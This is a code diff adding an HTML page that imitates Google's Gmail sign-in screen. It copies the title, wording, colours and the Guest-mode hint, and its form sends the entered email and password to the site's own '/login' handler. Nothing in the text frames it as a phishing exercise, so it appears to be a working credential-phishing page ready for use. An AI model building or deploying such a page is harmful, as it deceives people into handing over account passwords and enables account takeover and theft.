@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google Accounts</title>
+  <link rel="stylesheet" href="/static/gmail.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .gmail-login-box {
+      background: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      width: 360px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: left;
+    }
+    .gmail-login-box h2 {
+      color: #202124;
+      margin-bottom: 20px;
+    }
+    .gmail-login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .gmail-login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    .note {
+      font-size: 12px;
+      color: #666;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="gmail-login-box">
+    <h2>Sign in</h2>
+    <p>to continue to Gmail</p>
+    <form method="POST" action="/login">
+      <input type="text" name="username" placeholder="Email or phone" required />
+      <input type="password" name="password" placeholder="Enter your password" required />
+      <button type="submit">Next</button>
+    </form>
+    <div class="note">Not your computer? Use Guest mode to sign in privately.</div>
+  </div>
+</body>
+</html>
